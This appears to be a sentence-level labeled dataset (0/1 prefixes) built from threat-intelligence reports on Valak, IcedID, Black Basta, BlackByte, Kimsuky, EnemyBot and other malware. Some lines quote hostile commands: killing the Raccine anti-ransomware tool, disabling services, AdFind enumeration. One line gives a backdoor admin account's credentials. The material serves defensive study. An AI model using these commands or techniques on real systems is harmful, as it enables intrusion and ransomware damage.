0	Recent Valak infections show an increase in obfuscated code for configuration scripts used during the infection, possibly as an attempt to avoid detection.
0	Since April 2020, we have seen a great deal of Valak malware distributed by an actor sometimes referred to as Shathak/TA551.
0	This blog covers the history of Valak, reviews the chain of events for an infection, examines traffic generated by Valak and explores recent updates in obfuscation techniques used by the malware in order to evade detection.
0	The earliest public record of Valak comes from Proofpoint's ET Pro ruleset, where two rules detecting Valak were introduced on October 22, 2019, for the Suricata Open Source threat detection engine.
0	Valak was documented as follow-up malware during an Ursnif infection (also known as Gozi or IFSB) on December 19, 2019.
0	Analysis by Cybereason revealed Valak used a combination of techniques to remain persistent on an infected Windows host.
0	SentinelLabs (SentinelOne) published a report providing further information about Valak, including a connection between Valak malware distribution and campaigns similar to the Gozi ConfCrew.
0	The distribution network using malspam to push Valak has been called Shathak on Twitter.
0	Shathak has been attributed to an actor named TA551 on the Malware Dont Need Coffee blog.
0	Distribution characteristics were further explored in a Threat Spotlight on Valak published by Talos (Cisco).
0	This is an example of obfuscation that we have noted since June 2020, and it is covered in more detail later in this blog when discussing Valak developments.
0	EXE file with a .bin file extension from the June 24, 2020, Valak infection.
0	Contents of the JS file used to keep the Valak infection persistent.
0	Scheduled task for JS file used to keep the Valak infection persistent.
0	In our tests, running Valak from a U.S. location on a vulnerable Windows 10 host returned a banking Trojan called IcedID as the follow-up malware.
0	In one case, we saw both IcedID and NetSupport Manager RAT-based malware delivered as follow-up malware on a Windows 7 host from June 2020.
0	For example, for Valak infections from the June 24, 2020, wave, the decoy domains were:
0	pagead46.l.doubleclick.net
0	Also noted in Figure 5 are the malicious domains from the June 24, 2020, wave of Valak:
0	thepicklepilot.com
0	Figure 5 also shows three additional domains from the June 24, 2020, wave of Valak.
0	We primarily see IcedID as follow-up malware from the Valak infections generated from U.S. locations.
0	Figure 19 shows indicators of IcedID during the Valak infection traffic.
0	As Valak has developed, we have noticed increased obfuscation in the Valak configuration script.
0	This obfuscation finds its way into other script and Windows registry updates used to keep the infection persistent.
0	Figure 20 shows configuration script from June 23, 2020, using Valak software version 40.
0	Figure 21 shows configuration script from June 24, 2020, using Valak software version 41.
0	Note how variable names and some of the values were obfuscated when Valak changed from version 40 to version 41.
0	Shathak or TA551 is the name some security researchers have given to a specific distribution method that uses password-protected ZIP archives as attachments to malspam.
0	The distribution network may be associated with Russian cybercriminals.
0	It has used Word document templates targeting English-, Italian-, German- and Japanese-speaking recipients.
0	Appendix B lists examples of URLs from this campaign.
0	Prior to April 2020, the most common malware caused by Word documents associated with Shathak/TA551 was Ursnif.
0	Since April 2020, the most common malware distributed by these Word documents has been Valak.
0	Appendix C lists a series of Valak DLL examples from June 2020.
0	Since May 2020, passwords used for the ZIP attachments appear to be unique to each recipient.
0	2020-05-26 - hxxp://c1j4xptyujjpyt8[.
0	]com/gg88wyaftcxr7gu/wo0zz.php?l=sfzs9.cab
0	2020-05-27 - hxxp://ft23fpcu5yabw2[.
0	As noted previously, Appendix B provides more examples of these URLs generated by Word macros associated with Shathak/TA551.
0	Figures 22-30 provide screenshots with selected examples of malspam and the extracted Word documents associated with Shathak/TA551.
0	These images illustrate how the Shathak/TA551 distribution has evolved since February 2019.
0	Shathak/TA551 malspam to an English-speaking recipient from February 4, 2019.
0	Shathak/TA551 malspam to a German-speaking recipient from October 30, 2019.
0	This distribution network has generally pushed Ursnif in previous years, but since late April 2020, weve most often seen Valak from Shathak/TA551.
0	Information available at: https://raw.githubusercontent.com/pan-unit42/iocs/master/Valak/2020-03-23-to-2020-07-07-TA551-traffic-pattern-history-since-Valak.txt
0	Examples of SHA256 file hashes along with the associated file names for Word documents from Shathak/TA551 distribution during June 2020.
0	By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.
1	Whenever  an instance of  explorer.exe is launched (i.e., at every system startup), the system searches for the said .DLL file and loads it.EvilGrab drops one of  its .DLL components in the Windows folder, where explorer.
1	The numbers provided throughout this blog are based on an approximation derived from sampled threat telemetry.Delivery MethodsOf the campaigns analyzed, the following methods were used for malware delivery:Password Protected ZIP -> ISO -> LNK -> JS -> [CMD or BAT] -> DLL Delivery was via a password protected zip file that contained an ISO which itself contained a LNK file and archive holding the files used for IcedID installation.
1	When the LNK file is clicked by the user, it functions as a shortcut to run a script within the archive that ultimately installs IcedID from a DLL.
1	It is typically launched through either a CMD or BAT script, depending on which was included in the archive.Password Protected ZIP -> ISO -> CHM -> DLLDelivery was via a password protected zip file containing an ISO that led to a CHM (Compiled HTML) file.
1	The victim must open the file to launch the DLL and complete the infection process.
1	MaldocUsers received either a malicious Word or Excel file that asked them to enable macros, which then allowed the embedded script to execute and install IcedID.PrivateLoaderDelivery was through PrivateLoader, a pay-per-install service that distributes malware by hiding it in free software downloaded by unsuspecting users.
1	The Italian lure was in the form of a malicious .docm file with kolinandod[.]com as the C2, which was set to resolve to 159.203.5[.]238 on 12 September.
1	The lure targeting English speakers arrived using the following delivery method:Password Protected ZIP -> ISO -> LNK -> JS -> BAT -> DLLThe C2 was qvantumbrakesz[.]com, which resolves to 134.209.97[.]90.
1	Password Protected ZIP -> ISO -> CHM -> DLLNote: The use of CHMs was first spotted in a IcedID campaign on 8 August 2022, but the use of this file-type maliciously is a technique that has been around for several years.
1	The C2 was allozelkot[.]com and was set to resolve to 188.166.169[.]40 on the day of the campaign.
1	Seeing domains and IPs reused for Stage 2 bot C2s is not uncommon, but this is the first case of a Stage 1 downloader C2 reusing either since at least mid-August 2022.The campaign on September 15 (project ID 612758225) used the delivery method:Password Protected ZIP -> ISO -> LNK -> JS -> BAT -> DLLThe second campaign (project ID 3747825559), seen on 16 September, was delivered as an EXE dropped by PrivateLoader.There were around 79 potential victims and most of them first communicated with the C2 on 16 September.
1	Delivery consisted of a password protected zip file containing an ISO:Password Protected Zip -> ISO -> LNK -> DLLThe C2 was aviadronazhed[.]com, which was updated to resolve to 67.205.169[.]96 on the day of the campaign.
1	T2 traffic began about two and half hours after the victim traffic (17:30 UTC) and lasted around two and half hours after the last port 80 request (20:30 UTC).
1	Oddly, the C2 was then disconnected from the T2 instead of continuing to communicate for the usual period of approximately six days.Another oddity was that unlike other C2s where domains remained on the same IPs at the conclusion of a campaign, this domain was updated and removed from 67.205.169[.]96 on 22 September
1	For delivery it used a password protected zip file and ISO:Password Protected ZIP -> ISO -> LNK -> BAT -> DLLTwo campaigns were seen on 21 September, each with a unique project ID and domain: nikolandfantazy[.]com (project ID 1367965656) and zalikomanperis[.]com (project ID 2432960414).
1	The delivery was via a password protected zip containing an ISO:Password Protected ZIP -> ISO -> LNK -> JS -> CMD -> DLLThere were 29 potential victims from when the C2 was active between 20 - 27 September, with the last communication from a unique IP on port 80 happening on the 26 September.
1	These campaigns fell outside of the timeframe we were focusing on but due to their peculiarities we thought it would be interesting to add for comparison.9 SeptemberThe lure for this campaign (project ID 3207262051) was meant to be an XLSM file for English-speakers, but the threat actors used the Italian word for View on the button they wanted to convince users to click.
1	Figure 1  Screenshot from Hatching TriageThe C2 for this campaign was audifastinggip[.]com and it began resolving to 143.198.178[.]0 on 9 September.
1	Until 13 September around 12 potential victims were curious enough to click the Visualizza button, and communication with the T2 ended on 15 September.
1	22-23 SeptemberIt appears a key component of the process may have been skipped when setting up the C2 on 22 September (project ID 1023645195).
1	The C2 was trallfasterinf[.]com, and it resolves to 137.184.114[.]20.
1	The C2 for 23 September (project ID 2349072319) was sebdgoldingor[.]com, and it also resolves to 137.184.114[.]20.
1	Two campaigns seen the following Monday on 26 September contained the expected T2 traffic, so it appears the threat actors may have had a bit of a mishap with 137.184.114[.]20.Analysis/Key FindingsGEO TargetingThe 13 September campaign targeting Italian speakers resulted in 18 potential victims.
1	Along with other researchers, we noted that Black Basta infections began with Qakbot delivered by email and macro-based MS Office documents, ISO+LNK droppers and .docx documents exploiting the MSDTC remote code execution vulnerability, CVE-2022-30190.
1	One of the interesting initial access vectors we observed was an ISO dropper shipped as Report Jul 14 39337.iso that exploits a DLL hijacking in calc.exe.
1	Once the user clicks on the Report Jul 14 39337.lnk inside the ISO dropper, it runs the commandcmd.exe /q /c calc.exetriggering the DLL hijacking inside the calc binary and executing a Qakbot DLL, WindowsCodecs.dll.
1	Qakbot obtains a persistent foothold in the victim environment by setting a scheduled task which references a malicious PowerShell stored in the registry, acting as a listener and loader.
1	The powershell.exe process continues to communicate with different servers, waiting for an operator to send a command to activate the post-exploitation capability.
1	When an operator connects to the backdoor, typically hours or days after the initial infection, a new explorer.exe process is created and a process hollowing is performed to hide malicious activity behind the legitimate process.
1	The first step in a Black Basta compromise usually involves executing a uniquely obfuscated version of the AdFind tool, named AF.exe.
1	cmd /C C:\intel\AF.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName > C:\intel\[REDACTED].csv
1	This stage also often involves the use of two custom .NET assemblies loaded in memory to perform various information gathering tasks.
1	These assemblies are not obfuscated and the main internal class names, Processess and GetOnlineComputers, provide a good clue to their functions.
1	Black Basta operators have been observed using SharpHound and BloodHound frameworks for AD enumeration via LDAP queries.
1	The collector is also run in memory as a .NET assembly.
1	For network scanning, Black Basta uses the SoftPerfect network scanner, netscan.exe.
1	In one intrusion, we observed the Black Basta operator exploiting the PrintNightmare vulnerability and dropping spider.dll as the payload.
1	The DLL creates a new admin user with username Crackenn and password *aaa111Cracke:Reversed code for spider.dll
1	The DLL first sets the user and password into a struct (userInfo) then calls the NetUserAdd Win API to create a user with a never-expiring password.
1	It then adds Administrators and Remote Desktop Users groups to that account.
1	Next, spider.dll creates the RunTimeListen.exe process, which runs the SystemBC (aka Coroxy) backdoor, described below.
1	At this stage, Black Basta operators cover their tracks by deleting the added user and the DLL planted with the PrintNightmare exploit.
1	The threat actor has been observed dropping a self-extracting archive containing all the files needed to run the Netsupport Manager application, staged in the C:emp folder with the name Svvhost.exe.
1	Execution of the file extracts all installation files into:C:\Users\[USER]\AppData\Roaming\MSN\Archive of installation files for Netsupport Manager dropped by Black Basta
1	The RAT is then executed through a run.bat script.
1	In the most recent Black Basta incidents we observed, a batch file named SERVI.bat was deployed through psexec on all the endpoints of the targeted infrastructure.
1	This script was deployed by the attacker to kill services and processes in order to maximize the ransomware impact, delete the shadow copies and kill certain security solutions.
1	Analysis of the tool led us to further samples, one of which was packed with an unknown packer.
1	After unpacking, we identified it as the BIRDDOG backdoor, connecting to a C2 server at 45[.]67[.]229[.]148.
1	In the example the file spider.png.blackbyte has been encrypted by BlackByte.
1	By using the key in forest.png, we can decrypt the file and retrieve spider.png.
1	At no time is the original encrypted file, spider.png.blackbyte, modified.
1	It has a worm functionality similar to RYUK ransomware.
1	It creates a wake-on-LAN magic packet and sends it to the target host - making sure they are alive when infecting them.
1	The author hosted the encryption key in a remote HTTP server and in a hidden file with .PNG extension.
1	The author lets the program crash if it fails to download the encryption key.
1	The RSA public key embedded in the body is only used once, to encrypt the raw key to display in the ransom note  thats it.
1	The main function of the obfuscated Jscript is to decode the main payload and launch it in the memory.
1	The payload is a .NET DLL (managed code) that contains a class named jSfMMrZfotrr.
1	The main purpose of this DLL is the following:
1	Add .JS and .EXE file extensions into Microsoft Defender's exclusion list.
1	Evade the Microsoft Antimalware Scan Interface (AMSI) DLL so that it will not scan the loaded malware and alert the user for suspicious activity.
1	Before encrypting, BlackByte first prepares the system so that nothing may hamper it from its file encryption routine.
1	During the initialization, the ransomware sets the value of essential fields such as the ransom notes, the encrypted file extension, cryptographic salt, OS name, among others.Victim identification is then generated by combining the infected systems processor ID and the volume serial number and hashing them with MD5.The ransomware creates a mutex named Global\1f07524d-fb13-4d5e-8e5c-c3373860df25 and terminates if that mutex name already exists.
1	Afterward, it checks if the system language locale is on its list of language codes  as shown below.
1	The ransomware also sets its process priority class to above normal and uses SetThreadExecutionState API to prevent the system from entering sleep.
1	Itthen removes applications and terminates processes that can hinder the encryption of the target files.
1	It enumerates the registry key:HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution Options
1	And then deletes the following subkeys:vssadmin.exe,wbadmin.exe,bcdedit.exe,powershell.exe,diskshadow.exe,net.exe,taskkill.exe,wmic.exe
1	BlackByte terminates Raccine, an anti-ransomware utility, and uninstalls it from the infected systemby running the command:,taskill.exe /F /IM Raccine.exe,taskill.exe /F /IM RaccineSettings.exe,schtasks.exe /DELETE /TN \"Raccine Rules Updater\" /F
1	It also deletes any Raccine related registry keys including:，HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunName = Raccine TrayHKLM\SYSTEM\CurrentControlSet\Services\EventLog\Application\Raccine
1	It runs a series of SC commands to disable a list of services:，sc.exe config SQLTELEMETRY start = disabled，sc.exe config sc SQLTELEMETRY$ECWDB2 start = disabled，sc.exe config SQLWriter start = disabled，sc.exe config SstpSvc start = disabled，sc.exe config MBAMService start = disabled，sc.exe config wuauserv start = disabled
1	It also enables the following services:Dnscache，fdPHost，FDResPub，SSDPSRV，upnphost，RemoteRegistry
1	It uses the Microsoft Restart Manager API RmShutdown to terminate the following processes:，agntsvc，CNTAoSMgr，dbeng50，dbsnmp，encsvc，excel
1	The following living-off-the-land commands are also executed to delete all shadow copies on all volumes, delete Windows restore points, disable controlled folder access, enable network discovery, grant "everyone" full access to target drives, delete the recycle bin, enable file and printer sharing, and enable SMB1 protocol.
1	The ransomware sets the following registry settings to elevate local privilege, connect mapped drives, enable long paths:
1	BlackByte uses the mountvol.exe command to mount volume names and leverage the Microsoft Discretionary Access Control List tool  icacls.exe to grant the group to Everyone full access to the root of the drive.
1	This ransomware also has a worm capability.
1	It first checks if the file %AppData%\<Generated Victim ID> exists.
1	If this file does not exist, it means that the ransomware has not infected the network yet.
1	When the worm function is called, it initially sleeps for 10 seconds then queries at least 1,000 hostnames in the domain from the active directory.
1	network, BlackByte attempts to retrieve the defaultNamingContext from RootDSE from the Active Directory server, then it filters objects in the Active Directory identifying as computer and fetching a limit of up to 1,000 records.
1	It enumerates the returned record of hostnames, sends awake-on-lan magic packet and then pings the target hosts making sure they are alive.
1	BlackByte then proceeds to infect the host by copying itself to the path <hostname>\c$\Users\Public\obamka.js (if it has admin rights) or <hostname>\Users\Public\obamka.jsand then creates a scheduled task in the remote host to execute the file.
1	What we found interesting about this ransomware, is that it initially downloads a .PNG file from the link hxxp://45.9.148.114/forest.png which contains a key to be used later to encrypt the files.
1	If the ransomware fails to download the key, it will crash and will save the infected system from getting its files encrypted.
1	If the ransomware encounters a virtual hard drive file extension .vhd and .vhdx, it will attempt to dismount these drives using a PowerShell command:
1	To encrypt a file, it uses AES symmetric-key algorithm using the RFC2898 derived raw keys from the .png file.
1	In our case, the attribute files are created by calling device_create_file with attributes declared by the DEVICE_ATTR macro, which are:,name  Represents the attribute files name,mode  The permissions for attribute file,show  Function for reading from the attribute file
1	1. razer_attr_write_matrix_custom_frame receives the buffer that were writing to matrix_custom_frame as the buf argument.2.
1	Assigns row_id start_col and stop_col as the first, second and third bytes from the buf buffer, which we have complete controlover, as they are user input.
1	Passes the row_id, start_col, stop_col and the buf buffer, starting from the offset of the RGB data to razer_chroma_extended_matrix_set_custom_frame that callsrazer_chroma_extended_matrix_set_custom_frame2.
1	4.Calculates the row_length for the RGB values (each RGB value is three bytes long) based on start_col and stop_col.5.
1	Creates a new razer_report via get_razer_report that one of its members is a char array named arguments with the length of 80.6.
1	Puts the row_id (row_index), start_col and stop_col to the arguments buffer.7.
1	Copies row_length bytes from the buf buffer (rgb_data) to the arguments buffer.8.
1	Sends the new razer_report to the USB device.
1	The MSIAfterburnerSetup.msi installer file contains four executable files such as MSIAfterburnerSetup465Beta2.exe, install.exe, comp.cab, a cabinet file containing redline stealer, and browser_assistant.exe which loads XMR Miner.
1	When a user runs the MSIAfterburnerSetup.msi file, it further executes install.exe, which shows the installation wizard to install the program.
1	In the background, the installer drops a file named browser_assistent.exe in the %Program files% location and executes it.
1	Upon execution, the browser_assistent.exe Injects itself and loads a shellcode which gets the encoded XMR Miner binary from the GitHub repository and further injects it into explore.exe.
1	The malware installs XMR Miner silently in the background by injecting malicious code into a running process without saving the actual payload in the disk.
1	The loader browser_assistant.exe is a 64-bit PyInstaller executable with SHA256: 0e154eed00b71c0d11bd2caeb64fa2efcbb10524b797c076895752affa0f46c.
1	Upon execution of browser_assistant.exe, it drops multiple Python-supporting files into the %temp% directory.
1	During execution, it retrieves and injects the XMR Miner into explorer.exe using the following steps:
1	Initially, the Binary_Stub_Replacer.pyc decodes the actual data using replace function, converts the stub into binary format first, and then changes it into ASCII format, as shown in Figure 9.
1	The decoded stub forms a new python code containing an embedded base64 encoded content shown in Figure 10.
1	This python code decodes the base64encoded stub, which creates a shellcode.
1	Decoded python content (Stage 2)After that, the loaded Shellcode retrieves encoded raw data (XMR Miner) from the GitHub repository (hxxps[:]//raw.githubusercontent[.]com:443/CyberSECx/Dimitri_Quaser_LASTSM_B64/main/RawData), decodes it, injects it into explorer.exe and invokes the explorer.exe with the mining parameters shown in the below Figure 11.
1	Shellcode retrieves encoded XMR Miner content from GitHub
1	The injected XMR Miner further launches commands to connect the mining pool for crypto mining operations, as shown in the figure below.
1	Injected XMR mining pool details in the memory explorer.exe
1	The malware simultaneously collects sensitive information such as computer name, username, GPU, CPU, and other details from the victims system and sends them to the below C&C (Command and Control) server URL API:hxxp[:]//45[.]87[.]0[.]89/api/endpoint[.]php
1	Finally, the malware starts mining using the TAs wallet address on the victims machine to generate revenue.
1	On further analysis, we observed that the domainhas also hosteda fake Google Play Store page onthisURL:hxxps://acesso.sincronizadorltoken[.]com/playstore_downloadS34and hostedthefakeItaUnibancoapplication on it with 1,895,897 downloads(atthe time of our analysis)according to the websiteshown in Figure 6.
1	When the user clicks on theInstallbutton, the website will download a malicious application with the namesincronizador.apkfrom the URL:hxxps://acesso.sincronizadorltoken[.]com/playstore_downloadS34/sincronizador.apkas shown in Figure 7.
1	During oursource code review, we observed that the application uses customized AES/CBC algorithms to encrypt the strings,as shown in Figure 8.
1	The code snippet highlighted in Figure 9 shows that the application tries to open an application with the package namecom.itau.
1	We observed that this applicationtries toperform fraudulentfinancialtransactionsonthelegitimateItaUnibancoapplicationby tamperingwiththeusersinput fields.
1	It uses Word's external link to load the HTML and then uses the "ms-msdt" scheme to execute PowerShell code.https://t.co/hTdAfHOUx3 pic.twitter.com/rVSb02ZTwt nao_sec (@nao_sec) May 27, 2022
1	Onopening the malicious HTMLattachment,the user ispromptedtosubmitlogincredentialsforviewingPDF content,asdepictedinthefigure below.Our research indicates amalicious ActiveX componentthatautomaticallyrunsinthebackgroundas soon asthe user enables the document security control.This typeofPrecision Targeting involves advancedphishing attacksthat are difficult to detect and takedown by securityorganizations.
1	Theattached HTML page has a maliciousActiveXfunctionthat isused to sendtheharvested credentials tothe hackers serverusingasimple POST request,as shown below.
1	Thevictimsharvested credentialsmay be usedto gain unauthorized access and conduct further cyber espionage activities.Thecyberadversary may use the credentials to gain access to thetargeted infrastructureand stealconfidential information relatedto the COVID-19vaccine research and delivery.These sophisticatedphishing campaignsmayalso lead to furtherdamagessuch aspotentialdata breaches andundetectedsupply chain attacks.
1	In its new attack, the actor initiated the infection chain sending a spear-phishing email containing a macro-embedded Word document.
1	After the initial infection, a Visual Basic Script was delivered to the victim.
1	In this process, the actor abused a legitimate blog service to host a malicious script with an encoded format.
1	The implanted VBS file is capable of reporting information about infected machines and downloading additional payloads with an encoded format.
1	The final stage is a Windows executable-type malware that is capable of stealing information from the victim such as file lists, user keystrokes, and stored web browser login credentials.
1	The actor sends a spear-phishing email to the potential victim to download additional documents.
1	If the victim clicks the link, it results in a connection to the first stage C2 server, with an email address as parameter.
1	The first stage C2 server verifies the incoming email address parameter is an expected one and delivers the malicious document if its in the target list.
1	The first stage script also forwards the victims IP address to the next stage server.
1	When the fetched document is opened, it connects to the second C2 server.
1	The corresponding script on the second C2 server checks the IP address forwarded from the first stage server to check its an expected request from the same victim.
1	On top of that, the operator relies on several other processes to carefully deliver the next payload such as checking OS type and predefined user-agent strings.
1	As a result of analyzing the server-side script to convey a malicious document, we figured out how this actor verifies the request from the client and minimizes exposure of their payload.
1	This script works with a specific parameter name from the victim, so we suspect the actor delivers a download link to the victim via email or by sending a request using another type of payload.
1	It checks the who GET parameter from the victim.
1	The who parameter contains an email address without a domain name.
1	If the incoming request contains an expected email address, it saves the date, IP address and user-agent to the [who]_downhistory.txt file.
1	If the user-agent contains Windows, which means the victim is a Windows machine, it goes to the next step.Otherwise, it delivers a benign document to the victim.
1	Next, the script checks whether the connection from the victim is the first request or not by checking the existence of the [who].txt file.
1	If the [who].txt file does not exist, it means its the first request from the victim, so the script forwards the IP address to the other server (VBS server), delivering the malicious document, saving the victims information to the [who].txt including date, IP address and user-agent.
1	If the victim connects with an appropriate email address and if its an initial connection, the C2 script forwards the IP address to the specific servers with /index.php?ip= GET request.
1	Once this script receives an IP address in the ip parameter of the HTTP request, it extracts the victims IP address from ip parameter and saves it to the allow.txt file.
1	Otherwise, it saves the client information to the error.txt file and redirects the client to mail.google.com in this case.
1	Additionally, the author used various legitimate websites for redirection, such as naver.com, kisa.or.kr, or other popular email services.
1	The allow.txt file, which contains the appropriate victims IP address, is referred by another C2 script to verify whether the incoming request is valid and thus whether or not to deliver the next stage payload.
1	Also, we discovered that both malicious and benign documents are being delivered by this script.
1	The operator maintains a pair of documents, one benign (un.doc) and the other malicious (v.doc), and delivers the appropriate one depending on the result of the victim verification step.
1	Malicious documents delivered to the victim contain a macro to fetch the next stage payload.
1	The macro has a simple functionality and, interestingly, it spawns several child Windows command shells, probably intended for evading behavior-based analysis.
1	Eventually, the macro executes a fetched payload with the mshta.exe process that is designed to execute a Microsoft HTML Application.
1	Luckily, we discovered the corresponding C2 script (h.php) from our telemetry.
1	This script saves incoming traffic information to the log.txt file including the date, IP address, user-agent and the right-most 20 characters of the IP MD5 hash which is internally called TID (probably short for Target ID).
1	Next, it checks the presence of the allow.txt file that contains IP addresses of verified victims.
1	Only if the clients IP address exists in the allow.txt, is the next stage payload, h.txt, delivered.
1	Otherwise, the script delivers a short Visual Basic Script for terminating the mshta.exe process.
1	Allowing the macro in the malicious Word document to run leads the victim to fetch and execute an HTML Application (.HTA) payload.
1	The fetched HTA file has two main goals: reporting the victim information to the C2 server and creating a scheduled task for auto-execution.
1	The Kimsuky group tends to heavily reuse their code in various scripts; for instance, Visual Basic applications in macros, Visual Basic scripts and HTML applications.
1	The sent data contains the ProgramFiles folder path, antivirus name, recently opened file list, user name, OS name, OS version, Microsoft office version, .NET framework version, the file list from the Desktop folder, and a list of user-pinned taskbar items.
1	When the script delivers the collected information to the C2 server, it uses /info.php?ki87ujhy= format, the Kimsuky groups usual URL format for fingerprinting.
1	Notably, it uses a hard-coded user-agent, including the intentionally misspelled word Chnome.
1	After looking at the server-side script, we understand why they use Chnome and not Chrome.
1	Apart from the reporting capability, the fetched script downloads an additional payload and registers it with a persistence mechanism.
1	This code is also heavily used in other Kimsuky scripts and fetches the payload through s.php, saving it to the defs.ini file, registering the file as a Windows schedule, with the name OneDrive Clean in this case.
1	During our research, we discovered a corresponding C2 script (s.php) for delivering a payload for auto-execution.
1	The primary objectives of the delivered VBS payload are connecting to the legitimate blog, parsing the post and finally acquiring the next stage payload.
1	Interestingly, this C2 script generates a blog address based on the victims IP address.
1	After calculating the MD5 hash of the victims IP address, it cuts off the last 20 characters, and turns it into a blog address.
1	Additionally, the script checks whether the user-agent has an uncommon string, chnome.
1	As we mentioned earlier, the Visual Basic Script connects to this C2 script using a hard-coded chnome User-agent name and the script checks the misspelled user-agent to verify its an expected request from a real victim.
1	Unlike the earlier SSH brute-forcing campaign, the plaintext credentials are embedded into the malware instead of being downloaded from the C2.
1	To optimize brute forcing efforts, the malware compares the server prompt upon connection to a hardcoded list of strings to identify the possible device and then only tries the known credentials for that device.
1	This campaign seems especially interested in older devices with the Qualcomm MDM9625 chipset, such as LTE modems.
1	It attempts to specifically gain root access to these devices via a default password, despite having the same credentials in the list embedded in the binary.
1	Like the earlier SSH brute-forcing campaign, once it has successfully gained access, it sends the credentials used, the compromised devices IP address, and its architecture to the C2 server on a separate port, 5123.
1	After reporting, the malware attempts to install its main payload binary on the compromised device.
1	It first parses the Executable and Linkable Format (ELF) header of the /bin/busybox file for the e_machine field, which provides the architecture of the compromised device.
1	The bot then downloads its payload via software installed on the compromised device, such as ftpget, wget, curl, or tftp, before executing the payload.
1	The binary downloaders are written by echoing the bytes and piping the content to a file in the victim system.
1	As labeled in Figure 4, each binary has a hardcoded URL for downloading the payload binary of the proper architecture.
1	To encrypt files, Prestige Ransomware leverages the following public key.
1	Using Blob Analyzer from CryptoTester, the public key was identified as RSA Key.
1	Prestige Ransomware leverages the Crypto++ library during the encryption of files.
1	As it can be observed, Prestige Ransomware references multiple encryption algorithms such as AES and DES as shown below.
1	Prestige Ransomware traverses the directories, files, and processes to encrypt the content of files that have one of the hardcoded file extensions.
1	Prestige Ransomware enumerates through the directories and files through file APIs.
1	Prestige Ransomware uses reg.exe commands to register a custom file extension handler for files with .enc file extension.
1	Prestige Ransomware attempts to stop the MSSQL Windows service before encrypting the files using the net.exe command.
1	Prestige Ransomware reads the files before encryption.
1	Acquire the Crypto++ library as a container during the CryptAcquireContextA API call before the start of the encryption process.
1	Moves the file pointer of the specified file using SetFilePointerEx API.
1	Prestige Ransomware writes the encrypted data using WriteFile API.
1	After encrypting each file, the Prestige Ransomware appends the extension .enc to the existing extension of the file.
1	When a user tries to open encrypted files having file extension .enc, the custom file extension handler invokes Notepad to open C:\Users\Public\README which displays the ransom note YOU PERSONAL FILES HAVE BEEN ENCRYPTED describing what happened to the compromised system and includes an email address [emailprotected] to conduct ransom negotiations.
1	As can be observed from the trace tool, Prestige Ransomware runs the below processes and creates new files, registry keys, and rename the encrypted files as shown below.
1	Prestige Ransomware runs the following command to delete the backup catalog from the system:
1	PyMICROPSIA implements a simple HTTP POST-based C2 protocol, using different Uniform Resource Identifier (URI) paths and variables during the communication depending on the functionality invoked (full details on the implementation can be found in the Appendix).
1	The payload is downloaded with filename MetroIntelGenericUIFram.exe and has the following SHA-256:381b1efca980dd744cb8d36ad44783a35d01a321593a4f39a0cdae9c7eeac52fThe sample implements keylogging capabilities using the GetAsyncKeyState API method:It has a hardcoded configuration directly related to the directory structure initialized by the main PyMICROPSIA sample, so it needs to be compiled according to it.
1	The sample downloads another payload from the C2 server (see the File Download Capabilities section for more details).
1	In this version, rar.exe is downloaded from the C2 infrastructure and used with very similar parameters as observed in previous samples:For example, see how one recent sample of MICROPSIA makes use of rar.exe.SHA-256: 3c8979740d2f634ff2c0c0ab7adb78fe69d6d42307118d0bb934f03974deddac
1	Once the code is generated, its stored under the multipurpose folder MyFolderName.This identifier function will be used during C2 communications to keep track of the target.From a network perspective, the malware picks up a C2 server from the configured list based on a connectivity test via a POST request to a specific path:It then stores the resulting selected domain under the MyFolderName multipurpose folder.Once the initial setup is complete, the malware capabilities start by entering into a loop (see Figure 3) where:The protocol implemented is simple.
1	Messages are sent via HTTP POST requests, using different URI paths and variables depending on the functionality invoked.For example, when a file is uploaded, an HTTP POST request is built as follows:This request contains:When responses are received, if they contain operations to execute, they are sent via strings with components split with ; as delimiter.
1	Paths and parameters used during C2 interactions and their functionality..Based on the main activity loop, there will be a periodic call to the C2 server, and it will begin by sending information regarding the device (device identifier), as well as the last modified time in disk.It's interesting to see how this captures the latest disk activity date.
1	The ability to download files from the C2 is implemented via a POST request to the following URL path:/zoailloaze/sfuxmiibif/qprbudlsAs part of the POST request, a parameter named beau will be used to specify the type of file download.
1	Values of beau for sample download.The malware sample starts threads that will periodically upload compressed samples located in different folders.File uploads are performed via POST request to the following path:/zoailloaze/sfuxmiibif/hortense1Data is specified via a POST parameter, beau, that can contain several variables, always delimited with ;.
1	Files are specified with a POST parameter named terrel.Both the mentioned threads, as well as the operators via C2 interaction, can invoke upload code.
1	Here is one example of such a method, where the implementation can be observed:Screenshots are sent to the C2 using Pythons mss library both periodically as well as on demand if the C2 operator sends the appropriate command.Throughout the code, multiple methods oriented toward collecting information can be found.
1	The following example shows how the commands focus on specific extensions:The AridViper operators have the ability to send parameters together with the commands across the C2 interaction.
1	This module is a Python script file that downloads all dependencies and compiles the malware into different OS architectures including x86, ARM, macOS, OpenBSD, PowerPC, MIPS, and more (see figure 3)
1	Once compilation is complete, the script then creates a batch file update.sh which is used by the bot as a downloader that is then delivered to any identified vulnerable targets to spread the malware.
1	In new variants of EnemyBot, the malware added a webscan function containing a total of 24 exploits to attack vulnerabilities of different devices and web servers (see figure 8).
1	EnemyBot calls for a new function webscan_xywz.
1	To perform these functions, the malware randomly scans IP addresses and when it gets a response via SYN/ACK, EnemyBot then scans for vulnerabilities on the remote server by executing multiple exploits.
1	In the example shown in figure 12, notice that the malware elevates a local file inclusion (LFI) vulnerability into a RCE by injecting malicious code into the /proc/self/environ.
1	The malware uses LFI to call environ and passes the shell command in the user agent http header.
1	In case an Android device is connected through USB, or Android emulator running on the machine, EnemyBot will try to infect it by executing shell command.
1	After infection, EnemyBot will wait for further commands from its C&C.
1	However, in parallel it will also further propogate by scanning for additional vulnerable devices.
1	Maintain minimal exposure to the Internet on Linux servers and IoT devices and use a properly configured firewall.
1	Our analysis found that the Xenomorph banking malware is dropped from GitHub as a fake Google Service application upon installation of the app.
1	It starts with asking users to enable access permission.
1	Once provided, it adds itself as a device admin and prevents users from disabling Device Admin, making it uninstallable from the phone.
1	Xenomorph creates an overlay onto legit banking applications to trick users into entering their credentials.
1	Below is the Xenomorph infection cycle once a user downloads an app and opens it.
1	When the app is first opened, it reaches out to a Firebase server to get the stage/banking malware payload URL.
1	It then downloads the malicious Xenomorph banking trojan samples from Github.
1	This banking malware later reaches out to the command-and-control (C2) servers decoded either via Telegram page content or from a static code routine to request further commands, extending the infection.
